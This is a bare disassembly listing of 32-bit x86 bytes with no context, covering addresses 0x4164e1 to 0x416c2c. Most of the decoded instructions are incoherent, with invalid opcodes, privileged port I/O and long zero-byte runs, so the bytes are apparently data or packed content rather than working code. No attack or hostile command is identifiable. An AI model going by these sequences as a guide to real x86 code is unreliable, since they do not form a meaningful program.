  4164e1:	add    BYTE PTR [ebp+0x7c],dl
  4164e4:	and    bh,BYTE PTR ds:0xd0c552c7
  4164ea:	adc    BYTE PTR [esi+eax*4+0x4a],dl
  4164ee:	xor    eax,0x7dafa84b
  4164f3:	ins    DWORD PTR es:[edi],dx
  4164f4:	dec    edx
  4164f5:	call   DWORD PTR [eax-0x5a]
  4164f8:	and    dh,bh
  4164fa:	bound  esp,QWORD PTR [esp+ebx*2-0x12]
  4164fe:	stc    
  4164ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416500:	in     eax,0xb5
  416502:	jp     0x416502
  416504:	mov    al,0xf7
  416506:	cld    
  416507:	cmp    edi,DWORD PTR [edi]
  416509:	xchg   BYTE PTR [ecx],cl
  41650b:	mov    edi,0x208218c9
  416510:	scas   eax,DWORD PTR es:[edi]
  416511:	(bad)
  416515:	jmp    0x8afd5bc4
  41651a:	jl     0x41653a
  41651c:	ret    0x41f4
  41651f:	fst    DWORD PTR [ebp+0x29]
  416522:	out    dx,al
  416523:	ins    DWORD PTR es:[edi],dx
  416524:	leave  
  416525:	jnp    0x4164f5
  416527:	dec    edi
  416528:	leave  
  416529:	or     edx,DWORD PTR [esi-0x6f]
  41652c:	cmp    ebx,DWORD PTR [ebx]
  41652e:	aad    0xb7
  416530:	mov    BYTE PTR [ecx-0x7d],dl
  416533:	ud1    eax,DWORD PTR [esi+0x5b79c7af]
  41653a:	xor    eax,0xa1f4a6ba
  41653f:	xchg   edx,eax
  416540:	imul   ebx,DWORD PTR [edx],0xffffffd2
  416543:	mov    ds,WORD PTR [edx]
  416545:	mov    ah,0xce
  416547:	lea    eax,[ebx-0x9b5cc80]
  41654d:	push   edi
  41654e:	add    DWORD PTR [eax],esi
  416550:	lods   al,BYTE PTR ds:[esi]
  416551:	das    
  416552:	xchg   esp,eax
  416553:	rol    DWORD PTR [ecx-0x4a0a1e21],1
  416559:	cld    
  41655a:	pop    edi
  41655b:	pop    ebp
  41655c:	les    esi,FWORD PTR [edx-0x3f]
  41655f:	or     ebx,DWORD PTR [esi+0x71]
  416562:	lock sub ebx,0x6e7b8aae
  416569:	mov    ebp,0x2b4bc469
  41656e:	adc    ch,BYTE PTR [ecx-0x39]
  416571:	xor    al,0x26
  416573:	addr16 mov eax,ds:0x52c7
  416577:	push   esi
  416578:	ror    DWORD PTR [ecx-0x52],0x23
  41657c:	neg    esi
  41657e:	adc    al,0x1c
  416580:	adc    eax,0xc34e914a
  416585:	adc    bl,BYTE PTR [ebp-0xde4a1d8]
  41658b:	sbb    bh,BYTE PTR [edi+0x1b]
  41658e:	and    esi,DWORD PTR [edi]
  416590:	int3   
  416591:	jno    0x4165c7
  416593:	stos   BYTE PTR es:[edi],al
  416594:	mov    dl,0xbe
  416596:	test   al,0x92
  416598:	mov    dl,0x3d
  41659a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41659b:	xchg   ecx,eax
  41659c:	sbb    bl,BYTE PTR [edx]
  41659e:	push   0xd8db5038
  4165a3:	test   eax,0xbd6ef850
  4165a8:	jl     0x4165e9
  4165aa:	cs push esp
  4165ac:	mov    eax,ds:0xa8c15cac
  4165b1:	inc    esp
  4165b2:	add    al,0x44
  4165b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165b5:	loope  0x416563
  4165b7:	add    esi,DWORD PTR [edx]
  4165b9:	ds aas 
  4165bb:	inc    esi
  4165bc:	arpl   WORD PTR [ebp-0x4e],bp
  4165bf:	test   DWORD PTR [esi-0x7e86640b],ecx
  4165c5:	scas   al,BYTE PTR es:[edi]
  4165c6:	mov    esp,0x886de2a7
  4165cb:	fdiv   QWORD PTR [ebx+0x51]
  4165ce:	ss int 0x42
  4165d1:	cmp    eax,0x9e4b2dea
  4165d6:	dec    ebp
  4165d7:	jne    0x41659d
  4165d9:	ret    
  4165da:	das    
  4165db:	add    eax,0x90e39d08
  4165e0:	jbe    0x416596
  4165e2:	out    dx,eax
  4165e3:	stos   BYTE PTR es:[edi],al
  4165e4:	add    ebp,DWORD PTR [edx+0x5c]
  4165e7:	cld    
  4165e8:	iret   
  4165e9:	cmp    DWORD PTR [ebx+0x0],esi
  4165ec:	push   esi
  4165ed:	push   eax
  4165ee:	push   ebp
  4165ef:	(bad)  [edx-0x25352513]
  4165f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165f6:	mov    esp,0xf9f0141d
  4165fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165fc:	int    0xf
  4165fe:	(bad)  
  4165ff:	dec    eax
  416600:	pop    ecx
  416601:	imul   ebp,DWORD PTR [eax-0x3c26d35a],0xa81012c9
  41660b:	jl     0x41662f
  41660d:	jb     0x416616
  41660f:	xchg   ecx,eax
  416610:	jmp    0x8ea3:0xf0e2346c
  416617:	lea    ebx,[edi]
  416619:	fnstsw WORD PTR [ebp+edi*8+0x7f]
  41661d:	retf   0xffa6
  416620:	push   ebx
  416621:	pop    ss
  416622:	imul   eax,DWORD PTR [ecx],0x18
  416625:	ins    BYTE PTR es:[edi],dx
  416626:	mov    ecx,0x7bb8aae6
  41662b:	out    0xf6,eax
  41662d:	cwde   
  41662e:	fnstsw WORD PTR [ecx+0x30]
  416631:	mov    al,0x74
  416633:	call   0x9256ab6c
  416638:	add    dl,dh
  41663a:	mov    DWORD PTR [edx+ebx*8+0x75],ebp
  41663e:	popa   
  41663f:	lahf   
  416640:	inc    ebp
  416641:	in     al,0xa
  416643:	in     eax,dx
  416644:	(bad)  
  416645:	adc    BYTE PTR [esi-0x73],dh
  416648:	dec    edi
  416649:	xor    bh,dh
  41664b:	xchg   ebx,eax
  41664c:	jno    0x41669a
  41664e:	inc    edi
  41664f:	pop    esi
  416650:	hlt    
  416651:	jle    0x41667d
  416653:	retf   0xc8fa
  416656:	cdq    
  416657:	mov    BYTE PTR [edx-0x30],dl
  41665a:	push   esi
  41665b:	or     al,0x29
  41665d:	mov    ebx,0xdcc6b22a
  416662:	mov    esp,0x29bd0d4e
  416667:	div    DWORD PTR [edx]
  416669:	in     al,dx
  41666a:	loope  0x416621
  41666c:	push   ds
  41666d:	iret   
  41666e:	mov    ds:0xf3c33e68,eax
  416673:	add    eax,0xe444ceda
  416678:	pop    esi
  416679:	adc    bh,bl
  41667b:	xor    DWORD PTR [esi],esi
  41667d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41667e:	lods   al,BYTE PTR ds:[esi]
  41667f:	enter  0x3a78,0xd2
  416683:	mov    esi,0xaebcc1c6
  416688:	xchg   edx,eax
  416689:	(bad)  
  41668a:	push   0x3b
  41668c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41668d:	lock cmp bh,dh
  416690:	lea    esi,[ecx]
  416692:	dec    esp
  416693:	stos   BYTE PTR es:[edi],al
  416694:	stos   BYTE PTR es:[edi],al
  416695:	cld    
  416696:	clc    
  416697:	fst    DWORD PTR [ecx+eiz*8+0x33]
  41669b:	(bad)  
  41669c:	shr    DWORD PTR [ecx],cl
  41669e:	pop    ss
  41669f:	add    eax,0xde630525
  4166a4:	ret    
  4166a5:	inc    edx
  4166a6:	fst    QWORD PTR [ecx-0x3]
  4166a9:	push   edx
  4166aa:	jp     0x4166f9
  4166ac:	xchg   DWORD PTR [edx+0x59],eax
  4166af:	sub    esp,DWORD PTR [ebp-0x395110a9]
  4166b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166b6:	add    BYTE PTR [eax],dl
  4166b8:	xor    edx,edi
  4166ba:	add    BYTE PTR [esi-0x4843457a],cl
  4166c0:	arpl   WORD PTR [ebp-0x45],bp
  4166c3:	jno    0x416737
  4166c5:	ficom  WORD PTR [edi+edi*1-0x56]
  4166c9:	enter  0x9a93,0x5e
  4166cd:	pop    edi
  4166ce:	test   eax,0x82f757b8
  4166d3:	out    dx,eax
  4166d4:	out    0x34,al
  4166d6:	fwait
  4166d7:	xor    DWORD PTR [edi-0x7],esp
  4166da:	adc    DWORD PTR [ecx-0x5803bf0d],esi
  4166e0:	lea    ebx,[esi-0x35]
  4166e3:	inc    DWORD PTR [ecx]
  4166e5:	cs aam 0x74
  4166e8:	dec    esp
  4166e9:	xor    DWORD PTR [esp+ecx*2],0x7e
  4166ed:	add    BYTE PTR [eax],al
  4166ef:	add    BYTE PTR [eax],al
  4166f1:	dec    ecx
  4166f2:	inc    ebp
  4166f3:	dec    esi
  4166f4:	inc    esp
  4166f5:	scas   al,BYTE PTR es:[edi]
  4166f6:	inc    edx
  4166f7:	pusha  
  4166f8:	sub    BYTE PTR [eax],0x0
  4166fb:	add    BYTE PTR [eax],al
  4166fd:	add    BYTE PTR [eax],0x0
  416700:	add    BYTE PTR [eax],al
  416702:	add    DWORD PTR [eax],eax
  416704:	add    BYTE PTR [ecx],al
  416706:	add    BYTE PTR [eax],cl
  416708:	add    BYTE PTR [eax],al
  41670a:	add    BYTE PTR [eax],al
  41670c:	add    BYTE PTR [eax],al
  41670e:	dec    eax
	...
  416717:	add    BYTE PTR [eax],al
  416719:	add    BYTE PTR [ecx],al
	...
  416723:	add    BYTE PTR [eax],al
  416725:	add    al,BYTE PTR [edx]
  416727:	push   es
  416728:	add    BYTE PTR [edx],al
  41672a:	push   es
  41672b:	push   es
  41672c:	add    BYTE PTR [esi],al
  41672e:	push   es
  41672f:	push   es
  416730:	add    BYTE PTR ds:0x800020f,cl
  416736:	or     al,BYTE PTR [eax+eax*1]
  416739:	add    al,BYTE PTR [edx]
  41673b:	or     al,BYTE PTR [eax]
  41673d:	pop    es
  41673e:	push   es
  41673f:	or     al,BYTE PTR [eax]
  416741:	add    al,BYTE PTR [edx]
  416743:	push   cs
  416744:	add    BYTE PTR [edi],al
  416746:	or     cl,BYTE PTR [edx]
  416748:	add    BYTE PTR [edi],cl
  41674a:	(bad)  
  41674c:	add    BYTE PTR [edi],bl
  41674e:	add    al,0x4
  416750:	add    BYTE PTR [edx],dl
  416752:	add    cl,BYTE PTR [eax+eax*1]
  416755:	sbb    BYTE PTR [ebx],dl
  416757:	add    al,0x0
  416759:	push   ss
  41675a:	adc    al,0xf
  41675c:	add    BYTE PTR [edx],al
  41675e:	add    dl,BYTE PTR [edx]
  416760:	add    BYTE PTR [edx],al
  416762:	add    dl,BYTE PTR [esi]
  416764:	add    BYTE PTR [esi],al
  416766:	push   es
  416767:	push   ss
  416768:	add    BYTE PTR [eax],cl
  41676a:	add    dl,BYTE PTR [esi]
  41676c:	add    BYTE PTR [edx],al
  41676e:	or     dl,BYTE PTR [esi]
  416770:	add    BYTE PTR [eax+ecx*1],cl
  416773:	adc    al,0x0
  416775:	add    al,BYTE PTR [edx]
  416777:	sbb    al,BYTE PTR [eax]
  416779:	push   es
  41677a:	push   es
  41677b:	sbb    al,BYTE PTR [eax]
  41677d:	add    al,BYTE PTR [edx]
  41677f:	push   ds
  416780:	add    BYTE PTR [edx],cl
  416782:	add    al,0x1e
  416784:	add    BYTE PTR [edx],cl
  416786:	or     bl,BYTE PTR [eax+eax*1]
  416789:	femms  
  41678b:	sbb    al,0x0
  41678d:	sbb    ecx,DWORD PTR ds:0x100d0015
  416793:	push   ss
  416794:	add    BYTE PTR [edx],dl
  416796:	adc    al,0x1e
  416798:	add    BYTE PTR [ecx],ch
  41679a:	sbb    DWORD PTR [ecx],edx
  41679c:	add    BYTE PTR [ebx],ah
  41679e:	and    dl,BYTE PTR [eax+eax*1]
  4167a1:	add    al,BYTE PTR [edx]
  4167a3:	and    al,BYTE PTR [eax]
  4167a5:	add    al,BYTE PTR [esi]
  4167a7:	and    al,BYTE PTR [eax]
  4167a9:	push   es
  4167aa:	push   es
  4167ab:	and    al,BYTE PTR [eax]
  4167ad:	add    al,BYTE PTR [edx]
  4167af:	add    BYTE PTR es:[esi],al
  4167b2:	push   es
  4167b3:	add    BYTE PTR es:[eax],cl
  4167b6:	add    ah,BYTE PTR [esi]
  4167b8:	add    BYTE PTR [edx],cl
  4167ba:	push   es
  4167bb:	and    al,0x0
  4167bd:	add    eax,0xc00240c
  4167c2:	or     al,0x24
  4167c4:	add    BYTE PTR [edx],al
  4167c6:	add    ch,BYTE PTR [edx]
  4167c8:	add    BYTE PTR [esi],al
  4167ca:	add    ch,BYTE PTR [edx]
  4167cc:	add    BYTE PTR [esi],al
  4167ce:	push   es
  4167cf:	sub    al,BYTE PTR [eax]
  4167d1:	add    al,BYTE PTR [edx]
  4167d3:	add    BYTE PTR cs:[edi],al
  4167d6:	or     ch,BYTE PTR [eax+eax*1]
  4167d9:	push   cs
  4167da:	or     eax,0x1114002c
  4167df:	add    BYTE PTR es:[edx],bl
  4167e2:	pop    ss
  4167e3:	daa    
  4167e4:	add    BYTE PTR [ebx],bl
  4167e6:	sbb    eax,0x13100021
  4167eb:	sub    eax,0x2e1c1600
  4167f0:	add    BYTE PTR [edx],al
  4167f2:	add    dh,BYTE PTR [edx]
  4167f4:	add    BYTE PTR [esi],al
  4167f6:	push   es
  4167f7:	xor    al,BYTE PTR [eax]
  4167f9:	add    al,BYTE PTR [edx]
  4167fb:	add    BYTE PTR ss:[esi],al
  4167fe:	push   es
  4167ff:	add    BYTE PTR ss:[ebx],cl
  416802:	push   es
  416803:	xor    eax,0x340b0800
  416808:	add    BYTE PTR [esi],cl
  41680a:	or     eax,0x2020034
  41680f:	cmp    al,BYTE PTR [eax]
  416811:	add    al,BYTE PTR [esi]
  416813:	cmp    al,BYTE PTR [eax]
  416815:	push   es
  416816:	push   es
  416817:	cmp    al,BYTE PTR [eax]
  416819:	add    al,BYTE PTR [edx]
  41681b:	add    BYTE PTR ds:[edx],al
  41681e:	push   es
  41681f:	add    BYTE PTR ds:[esi],cl
  416822:	push   es
  416823:	cmp    al,BYTE PTR [eax]
  416825:	or     BYTE PTR [ebx],cl
  416827:	cmp    al,0x0
  416829:	or     eax,0x14003d0e
  41682e:	or     eax,0x130c0038
  416833:	cmp    BYTE PTR [eax],al
  416835:	adc    edx,DWORD PTR [edx]
  416837:	xor    eax,0x32161800
  41683c:	add    BYTE PTR ds:0x1300331b,bl
  416842:	adc    al,0x3e
  416844:	add    BYTE PTR [ebx],bl
  416846:	adc    eax,0x1d1e003e
  41684b:	add    BYTE PTR ds:0x24002328,ch
  416852:	and    esi,DWORD PTR [eax]
  416854:	add    BYTE PTR [ecx],ch
  416856:	and    DWORD PTR ds:0x3e282800,edi
  41685c:	add    BYTE PTR [esi],dh
  41685e:	cs aaa 
  416860:	add    BYTE PTR [edx],al
  416862:	add    al,BYTE PTR [edx+0x0]
  416865:	add    al,BYTE PTR [edx]
  416867:	inc    esi
  416868:	add    BYTE PTR [edx],al
  41686a:	push   es
  41686b:	inc    esi
  41686c:	add    BYTE PTR [ebx+ecx*1],al
  41686f:	inc    ecx
  416870:	add    BYTE PTR [edx],al
  416872:	add    cl,BYTE PTR [edx+0x0]
  416875:	push   es
  416876:	add    cl,BYTE PTR [edx+0x0]
  416879:	push   es
  41687a:	push   es
  41687b:	dec    edx
  41687c:	add    BYTE PTR [edx],al
  41687e:	add    cl,BYTE PTR [esi+0x0]
  416881:	add    cl,BYTE PTR ds:0xd0d004e
  416887:	dec    esp
  416888:	add    BYTE PTR ds:0xb004510,cl
  41688e:	sbb    BYTE PTR [edx+0x0],cl
  416891:	adc    bl,BYTE PTR [ebx]
  416893:	inc    eax
  416894:	add    BYTE PTR ds:0x19004814,dl
  41689a:	sbb    ecx,DWORD PTR [edx+0x0]
  41689d:	add    al,BYTE PTR [edx]
  41689f:	push   edx
  4168a0:	add    BYTE PTR [edx],al
  4168a2:	add    dl,BYTE PTR [esi+0x0]
  4168a5:	add    al,0xa
  4168a7:	push   esp
  4168a8:	add    BYTE PTR [edx],al
  4168aa:	add    bl,BYTE PTR [edx+0x0]
  4168ad:	push   es
  4168ae:	push   es
  4168af:	pop    edx
  4168b0:	add    BYTE PTR [edx],al
  4168b2:	add    bl,BYTE PTR [esi+0x0]
  4168b5:	push   es
  4168b6:	push   es
  4168b7:	pop    esi
  4168b8:	add    BYTE PTR [ecx*1+0xa09005a],cl
  4168bf:	pop    edi
  4168c0:	add    BYTE PTR ds:0x11005111,cl
  4168c6:	sbb    BYTE PTR [esi+0x0],dl
  4168c9:	adc    dl,BYTE PTR [ecx]
  4168cb:	pop    esp
  4168cc:	add    BYTE PTR [edx],bl
  4168ce:	pop    ds
  4168cf:	pop    edx
  4168d0:	add    BYTE PTR [ecx],bl
  4168d2:	and    al,0x4d
  4168d4:	add    BYTE PTR ds:0x2a004b21,ah
  4168da:	sub    cl,BYTE PTR [eax+eax*1+0x2]
  4168de:	add    ah,BYTE PTR [edx+0x0]
  4168e1:	add    al,BYTE PTR [edx]
  4168e3:	data16 add BYTE PTR [esi],al
  4168e6:	push   es
  4168e7:	add    BYTE PTR fs:[edx],cl
  4168ea:	add    ah,BYTE PTR [esi+0x0]
  4168ed:	push   es
  4168ee:	or     al,0x64
  4168f0:	add    BYTE PTR [edx],al
  4168f2:	add    ch,BYTE PTR [eax+eax*1+0x7]
  4168f6:	or     ebp,DWORD PTR [eax+eax*1+0xd]
  4168fa:	sbb    ah,BYTE PTR [ebx+0x0]
  4168fd:	adc    BYTE PTR [ecx],dl
  4168ff:	add    BYTE PTR fs:[ecx],bl
  416902:	sbb    BYTE PTR [eax+eax*1+0x10],ah
  416906:	adc    ebp,DWORD PTR [eax+eax*1+0x13]
  41690a:	sbb    ebp,DWORD PTR [edi+0x0]
  41690d:	add    al,BYTE PTR [edx]
  41690f:	je     0x416911
  416911:	or     al,BYTE PTR [edx]
  416913:	jb     0x416915
  416915:	add    cl,BYTE PTR [edx]
  416917:	je     0x416919
  416919:	push   cs
  41691a:	or     eax,0x2020072
  41691f:	jl     0x416921
  416921:	push   cs
  416922:	push   es
  416923:	jp     0x416925
  416925:	pop    es
  416926:	or     edi,DWORD PTR [ebp+0x0]
  416929:	or     al,0xf
  41692b:	jge    0x41692d
  41692d:	unpcklps xmm6,XMMWORD PTR [esi+0x0]
  416931:	push   cs
  416932:	push   ds
  416933:	jl     0x416935
  416935:	sbb    DWORD PTR [ecx],esp
  416937:	add    BYTE PTR [di],dl
  41693a:	daa    
  41693b:	jo     0x41693d
  41693d:	sub    esp,DWORD PTR es:[eax+eax*1+0x24]
  416942:	and    edi,DWORD PTR [ebp+0x0]
  416945:	and    esi,DWORD PTR [ecx]
  416947:	jne    0x416949
  416949:	das    
  41694a:	cmp    eax,0x38400075
  41694f:	dec    eax
  416950:	add    BYTE PTR [edx+ecx*2+0x54],cl
  416954:	add    BYTE PTR [edx],al
  416956:	add    al,BYTE PTR [eax+eax*1+0x850d0d]
  41695d:	add    al,BYTE PTR [edx]
  41695f:	mov    WORD PTR [eax],es
  416961:	add    eax,0x6008908
  416966:	adc    al,BYTE PTR [ebp-0x70edf400]
  41696c:	add    BYTE PTR [ebx],cl
  41696e:	push   ds
  41696f:	mov    al,BYTE PTR [eax]
  416971:	add    al,BYTE PTR [edx]
  416973:	xchg   esp,eax
  416974:	add    BYTE PTR ds:0x500940e,cl
  41697a:	push   es
  41697b:	call   0x400:0x9c020200
  416982:	or     bl,BYTE PTR [eax-0x62f1fd00]
  416988:	add    BYTE PTR [esi+ecx*1],cl
  41698b:	pushf  
  41698c:	add    BYTE PTR [esi],dl
  41698e:	sbb    dl,BYTE PTR [edx-0x7dd3ea00]
  416994:	add    BYTE PTR ds:0x1000922f,dl
  41699a:	es cdq 
  41699c:	add    BYTE PTR [edx],ah
  41699e:	cmp    DWORD PTR [ecx-0x63c1e000],ecx
  4169a4:	add    BYTE PTR [edx],al
  4169a6:	add    ah,BYTE PTR [eax+eax*1+0xae0302]
  4169ad:	pop    es
  4169ae:	or     al,0xac
  4169b0:	add    BYTE PTR [ebx],dl
  4169b2:	push   cs
  4169b3:	mov    al,ds:0xa5100500
  4169b8:	add    BYTE PTR [ebx+edx*1],cl
  4169bb:	scas   al,BYTE PTR es:[edi]
  4169bc:	add    BYTE PTR ds:0x1300ac1c,cl
  4169c2:	push   ss
  4169c3:	mov    ds:0xb60b0400,al
  4169c8:	add    BYTE PTR [ebx],al
  4169ca:	add    edi,DWORD PTR [ecx-0x45eef500]
  4169d0:	add    BYTE PTR [ecx],cl
  4169d2:	sbb    bh,BYTE PTR [edx-0x44e6e900]
  4169d8:	add    BYTE PTR ds:0x1b00ae26,cl
  4169de:	and    DWORD PTR [ecx-0x53ccec00],esp
  4169e4:	add    BYTE PTR [ecx],bl
  4169e6:	ds mov dl,0x0
  4169e9:	sub    eax,0x1d00994d
  4169ee:	dec    esp
  4169ef:	mov    dh,0x0
  4169f1:	adc    BYTE PTR [esi-0x47],bl
  4169f4:	add    BYTE PTR [esi+edx*2],ch
  4169f7:	stos   BYTE PTR es:[edi],al
  4169f8:	add    BYTE PTR ds:0x4300b66a,ch
  4169fe:	jo     0x4169bd
  416a00:	add    BYTE PTR [edx],al
  416a02:	add    al,dl
  416a04:	add    BYTE PTR [ebx],al
  416a06:	or     al,0xc2
  416a08:	add    BYTE PTR [esp+ecx*1],cl
  416a0b:	mov    BYTE PTR [eax],0x3
  416a0e:	push   es
  416a0f:	enter  0x200,0x3
  416a13:	int    0x0
  416a15:	add    ecx,DWORD PTR [esi+ecx*8]
  416a18:	add    BYTE PTR [ecx],cl
  416a1a:	adc    al,0xc7
  416a1c:	add    BYTE PTR [edx],cl
  416a1e:	push   ds
  416a1f:	retf   
  416a20:	add    BYTE PTR [edx],al
  416a22:	add    ebx,edx
  416a24:	add    BYTE PTR [edx],al
  416a26:	or     al,0xdc
  416a28:	add    BYTE PTR [esi],al
  416a2a:	adc    edx,edx
  416a2c:	add    BYTE PTR ds:0x1900df1b,al
  416a32:	sub    edx,eax
  416a34:	add    BYTE PTR [ecx],dl
  416a36:	xor    ecx,esp
  416a38:	add    BYTE PTR [edi+edi*1],ah
  416a3b:	mov    BYTE PTR [eax],0x3
  416a3e:	add    al,0xe7
  416a40:	add    BYTE PTR [ebx],al
  416a42:	adc    ch,bl
  416a44:	add    BYTE PTR [edx],al
  416a46:	pop    es
  416a47:	clc    
  416a48:	add    BYTE PTR [ebx],al
  416a4a:	sbb    bl,bh
  416a4c:	add    BYTE PTR [edi],cl
  416a4e:	sub    edx,esp
  416a50:	add    BYTE PTR [edi],dl
  416a52:	cmp    al,0xe0
  416a54:	add    BYTE PTR [edx],cl
  416a56:	and    eax,0x330d00f8
  416a5b:	clc    
  416a5c:	add    BYTE PTR [ecx*2+0x5c3000d4],bl
  416a63:	rol    BYTE PTR [eax],cl
  416a65:	adc    eax,0x3000cf6c
  416a6a:	jae    0x416a3b
  416a6c:	add    BYTE PTR [ebx],dl
  416a6e:	inc    edi
  416a6f:	stc    
  416a70:	add    BYTE PTR [ebx],ch
  416a72:	push   edx
  416a73:	lock add BYTE PTR [ecx],bl
  416a76:	push   0x7b2300f0
  416a7b:	lock add BYTE PTR [eax+0x7f],ah
  416a7f:	xlat   BYTE PTR ds:[ebx]
  416a80:	add    BYTE PTR [ebx+0x6b],cl
  416a83:	in     al,0x0
  416a85:	push   0xc00b8cc
  416a8a:	call   0xc6:0x822100c4
  416a91:	cmp    eax,0x2d00c286
  416a96:	xchg   edx,eax
  416a97:	into   
  416a98:	add    BYTE PTR [edx],bh
  416a9a:	xchg   esi,ebx
  416a9c:	add    BYTE PTR [edi+eiz*4],bl
  416a9f:	xlat   BYTE PTR ds:[ebx]
  416aa0:	add    BYTE PTR [edx],bh
  416aa2:	test   eax,0x970c00d5
  416aa7:	stc    
  416aa8:	add    BYTE PTR [eax],bh
  416aaa:	popf   
  416aab:	in     al,dx
  416aac:	add    BYTE PTR [ebx],bh
  416aae:	mov    dh,0xf4
  416ab0:	add    BYTE PTR [esi-0x63],cl
  416ab3:	iret   
  416ab4:	add    BYTE PTR [ecx-0x52],bl
  416ab7:	aam    0x0
  416ab9:	inc    esi
  416aba:	mov    bh,0xdb
  416abc:	add    BYTE PTR [ebx-0x47],ah
  416abf:	fiadd  DWORD PTR [eax]
  416ac1:	jno    0x416a51
  416ac3:	jmp    0x2700:0xdac11d00
  416aca:	fsubr  st,st(3)
  416acc:	add    BYTE PTR [edi-0x3c],cl
  416acf:	fld    QWORD PTR [eax]
  416ad1:	jb     0x416a9c
  416ad3:	fadd   QWORD PTR [eax]
  416ad5:	pop    esi
  416ad6:	shr    esi,0x0
  416ad9:	dec    esp
  416ada:	aad    0xe7
  416adc:	add    BYTE PTR [ecx-0x2d],ch
  416adf:	out    dx,eax
  416ae0:	add    BYTE PTR [edx-0xf],bl
  416ae3:	cmc    
  416ae4:	add    BYTE PTR [ebx-0x18],ch
  416ae7:	jecxz  0x416ae9
  416ae9:	jns    0x416ae4
  416aeb:	stc    
  416aec:	add    BYTE PTR [edi-0x77ff1457],al
  416af2:	int    0xe1
  416af4:	add    BYTE PTR [edx-0x61ff1c21],al
  416afa:	fucom  st(5)
  416afc:	add    BYTE PTR [edx-0x4aff103d],ah
  416b02:	(bad)  
  416b04:	add    BYTE PTR [eax-0x44ff0e16],bl
  416b0a:	lock out dx,eax
  416b0c:	add    BYTE PTR [edx-0x29ff0c03],bh
  416b12:	std    
  416b13:	clc    
  416b14:	add    bh,bh
  416b16:	(bad)  
  416b17:	inc    DWORD PTR [eax]
  416b19:	fcmovbe st,st(1)
  416b1b:	inc    DWORD PTR [eax]
  416b1d:	(bad)  
  416b1e:	(bad)  
  416b1f:	inc    DWORD PTR [eax]
	...
  416b29:	dec    esi
  416b2a:	dec    ecx
  416b2b:	sub    eax,0x3b3b1729
  416b30:	and    BYTE PTR [ecx+ebp*1],dh
  416b33:	and    esi,DWORD PTR [esi]
  416b35:	sub    DWORD PTR [eax],esp
  416b37:	sub    al,0x34
  416b39:	sub    al,0x2c
  416b3b:	xor    al,0x2c
  416b3d:	push   ecx
  416b3e:	ds sub al,0x36
  416b41:	sub    al,0x29
  416b43:	push   ecx
  416b44:	cmp    edi,DWORD PTR ss:[ebx]
  416b47:	xor    al,0x34
  416b49:	cmp    edi,DWORD PTR [ebx]
  416b4b:	cmp    ebp,DWORD PTR [ecx]
  416b4d:	ss sub al,0x34
  416b50:	cmp    esi,DWORD PTR [esi+esi*1]
  416b53:	push   eax
  416b54:	ss push eax
  416b56:	push   ecx
  416b57:	xor    al,0x54
  416b59:	push   ecx
  416b5a:	push   eax
  416b5b:	cmp    edi,DWORD PTR [esi]
  416b5d:	outs   dx,DWORD PTR ds:[esi]
  416b5e:	push   esp
  416b5f:	ds ss push ecx
  416b62:	ds push esp
  416b64:	cmp    edx,DWORD PTR [edi+0x7b]
  416b67:	push   ecx
  416b68:	push   ecx
  416b69:	push   esp
  416b6a:	pop    edi
  416b6b:	cmp    edi,DWORD PTR [esi]
  416b6d:	push   edi
  416b6e:	cmp    edi,DWORD PTR ds:[ebx]
  416b71:	push   ecx
  416b72:	ds push esp
  416b74:	xor    al,0x3e
  416b76:	push   eax
  416b77:	ds ds ds sub al,0x3e
  416b7c:	and    edx,DWORD PTR ss:[ecx+0x3b]
  416b80:	sub    DWORD PTR [esi],esi
  416b82:	push   ecx
  416b83:	ss xor al,0x36
  416b86:	ds ss ds ds sub al,0x2c
  416b8c:	ss cmp edi,DWORD PTR ss:[esi]
  416b90:	push   edi
  416b91:	push   ecx
  416b92:	push   eax
  416b93:	push   eax
  416b94:	push   eax
  416b95:	push   ecx
  416b96:	pop    esi
  416b97:	pop    esi
  416b98:	mov    eax,DWORD PTR [eax]
	...
  416ba6:	add    BYTE PTR [edx],dh
  416ba8:	and    edi,DWORD PTR [ebx]
  416baa:	ss push eax
  416bac:	push   eax
  416bad:	sub    DWORD PTR ds:[esi],edi
  416bb0:	xor    al,0x29
  416bb2:	ss sub al,0x34
  416bb5:	sub    DWORD PTR ds:[esi],esi
  416bb8:	xor    al,0x29
  416bba:	push   ecx
  416bbb:	and    BYTE PTR [ebx],bh
  416bbd:	push   eax
  416bbe:	ds push esp
  416bc0:	and    BYTE PTR ds:0x365f512c,dl
  416bc6:	sub    DWORD PTR [eax+0x50],edx
  416bc9:	push   eax
  416bca:	cmp    edx,DWORD PTR [eax+edx*2+0x54]
  416bce:	push   eax
  416bcf:	ds push eax
  416bd1:	push   esp
  416bd2:	pusha  
  416bd3:	xor    al,0x3e
  416bd5:	push   ecx
  416bd6:	push   esp
  416bd7:	cmp    ebx,DWORD PTR [edi+0x57]
  416bda:	cmp    esi,DWORD PTR [esp+edx*2+0x3e]
  416bde:	push   eax
  416bdf:	pusha  
  416be0:	pop    edi
  416be1:	push   esp
  416be2:	push   esp
  416be3:	outs   dx,DWORD PTR ds:[esi]
  416be4:	push   esp
  416be5:	ds sub al,0x3b
  416be8:	bound  esi,QWORD PTR [edi+ebp*2+0x34]
  416bec:	xor    al,0x51
  416bee:	ss ss push eax
  416bf1:	bound  esi,QWORD PTR [edi+edx*2]
  416bf4:	push   ecx
  416bf5:	ds push esp
  416bf7:	push   ecx
  416bf8:	push   eax
  416bf9:	pusha  
  416bfa:	pusha  
  416bfb:	sub    DWORD PTR [ebx],edi
  416bfd:	xor    al,0x6f
  416bff:	ss push ecx
  416c01:	ds ds sub al,0x2c
  416c05:	sub    al,0x34
  416c07:	ss cmp edi,DWORD PTR ss:[ebx]
  416c0b:	xor    al,0x60
  416c0d:	push   edi
  416c0e:	cmp    esi,DWORD PTR ds:[esi]
  416c11:	push   eax
  416c12:	ds xor al,0x36
  416c15:	ss xor al,0x3b
  416c18:	xor    al,0x36
  416c1a:	dec    ebp
	...
  416c23:	add    BYTE PTR [eax],al
  416c25:	dec    esi
  416c26:	and    BYTE PTR [ebx],ah
  416c28:	and    BYTE PTR [edi],dl
  416c2a:	sub    al,0x17
  416c2c:	adc    BYTE PTR [ebx],ah
